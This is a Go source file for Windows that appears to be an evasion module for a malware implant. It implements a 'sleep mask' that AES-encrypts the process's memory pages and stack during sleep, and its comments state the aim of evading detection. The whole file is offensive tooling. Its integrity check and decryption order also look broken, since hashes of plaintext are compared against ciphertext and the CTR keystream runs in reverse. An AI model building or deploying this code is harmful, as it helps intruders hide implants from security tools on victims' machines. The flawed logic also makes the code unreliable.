//go:build windows && amd64

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	crand "crypto/rand"
	"fmt"
	"sync"
	"unsafe"
)

// advancedMaskState holds state for the advanced sleep mask.
// It combines AES-CTR page encryption with stack splicing
// and SHA-256 integrity verification to provide strong evasion.
type advancedMaskState struct {
	mu               sync.Mutex
	key              [32]byte
	iv               [aes.BlockSize]byte
	pages            []advPage
	pageHashes       [][]byte
	stackBase        uintptr
	stackSize        uintptr
	stackBuf         []byte
	ready            bool
	encrypted        bool
	integrityFailures int32
}

type advPage struct {
	base uintptr
	size uintptr
	prot uint32
}

// memBasicInfo mirrors MEMORY_BASIC_INFORMATION for VirtualQuery.
type memBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	PartitionID       uint16
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

var (
	advCtx        advancedMaskState
	advInitOnce   sync.Once
	aVirtualQuery = kernel32.NewProc("VirtualQuery")
)

type advMask struct{}

func getAdvancedMask() SleepMasker {
	advInitOnce.Do(advInit)
	if !advCtx.ready {
		return nil
	}
	return &advMask{}
}

func advInit() {
	if !enableSleepMask {
		return
	}
	if _, err := crand.Read(advCtx.key[:]); err != nil {
		return
	}
	advCtx.ready = true
	registerSleepMask("advanced", func() SleepMasker { return &advMask{} })
}

// advStackPtr returns the current stack pointer.
func advStackPtr() uintptr {
	var x int
	return uintptr(unsafe.Pointer(&x))
}

// Encrypt performs full-page AES-CTR encryption with a fresh random key per cycle.
// Before encrypting, it snapshots the stack so it can be restored after decrypt.
// After encrypting, it stores SHA-256 hashes for integrity verification.
func (m *advMask) Encrypt() {
	advCtx.mu.Lock()
	defer advCtx.mu.Unlock()
	if !advCtx.ready {
		return
	}

	crand.Read(advCtx.key[:])
	crand.Read(advCtx.iv[:])

	sp := advStackPtr()
	var mbi memBasicInfo
	aVirtualQuery.Call(sp, uintptr(unsafe.Pointer(&mbi)), uintptr(unsafe.Sizeof(mbi)))
	if mbi.State == memCommit && mbi.Protect != pageNoaccess {
		advCtx.stackBase = mbi.BaseAddress
		advCtx.stackSize = mbi.RegionSize
		advCtx.stackBuf = make([]byte, advCtx.stackSize)
		advCopyMem(advCtx.stackBuf, advCtx.stackBase, advCtx.stackSize)
	}

	advCtx.pages = advEnumPages()
	advEncryptPages(advCtx.pages)
	advCtx.encrypted = true
}

// Decrypt reverses the page encryption and restores the stack.
// It verifies SHA-256 integrity before restoring each page.
func (m *advMask) Decrypt() {
	advCtx.mu.Lock()
	defer advCtx.mu.Unlock()
	if !advCtx.ready || !advCtx.encrypted {
		return
	}

	advDecryptPages(advCtx.pages)
	advCtx.pages = nil
	advCtx.pageHashes = nil
	advCtx.encrypted = false

	if advCtx.stackBuf != nil && advCtx.stackSize > 0 {
		var old uint32
		procVirtualProtect.Call(advCtx.stackBase, advCtx.stackSize, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))
		advWriteMem(advCtx.stackBase, advCtx.stackBuf, advCtx.stackSize)
		procVirtualProtect.Call(advCtx.stackBase, advCtx.stackSize, uintptr(old), uintptr(unsafe.Pointer(&old)))
		advCtx.stackBuf = nil
	}
}

func (m *advMask) BeforeSleep(durationMs uintptr) {
	if sleepObfFunc != nil {
		sleepObfFunc(durationMs)
		return
	}
	procSleep.Call(durationMs)
}

func (m *advMask) AfterWake() {}

func (m *advMask) Name() string { return "advanced" }

func advEnumPages() []advPage {
	var out []advPage
	addr := uintptr(0)
	for {
		var m memBasicInfo
		ret, _, _ := aVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&m)), uintptr(unsafe.Sizeof(m)))
		if ret == 0 {
			break
		}
		if m.State == memCommit && m.Protect != pageNoaccess {
			out = append(out, advPage{base: m.BaseAddress, size: m.RegionSize, prot: m.Protect})
		}
		next := m.BaseAddress + m.RegionSize
		if next <= addr {
			break
		}
		addr = next
	}
	return out
}

func advEncryptPages(pages []advPage) {
	block, err := aes.NewCipher(advCtx.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, advCtx.iv[:])

	advCtx.pageHashes = make([][]byte, len(pages))

	for i := range pages {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		h := sha256.Sum256(buf)
		advCtx.pageHashes[i] = h[:]

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

func advDecryptPages(pages []advPage) {
	block, err := aes.NewCipher(advCtx.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, advCtx.iv[:])

	for i := len(pages) - 1; i >= 0; i-- {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		if i < len(advCtx.pageHashes) && advCtx.pageHashes[i] != nil {
			h := sha256.Sum256(buf)
			if !bytes.Equal(h[:], advCtx.pageHashes[i]) {
				advCtx.integrityFailures++
				if advCtx.integrityFailures <= 3 {
					if Debug {
						fmt.Printf("[sleepmask] advanced: integrity failure on page %d (total: %d)\n", i, advCtx.integrityFailures)
					}
				}
				if advCtx.integrityFailures == 1 {
					reportSleepMaskIntegrityFailure("advanced", i)
				}
				continue
			}
		}

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

// advCopyMem copies memory from src address to dst buffer.
func advCopyMem(dst []byte, src uintptr, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		dst[i] = *(*byte)(unsafe.Pointer(src + i))
	}
}

// advWriteMem writes src buffer to dst address.
func advWriteMem(dst uintptr, src []byte, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = src[i]
	}
}

func init() {
	advInitOnce.Do(advInit)
}
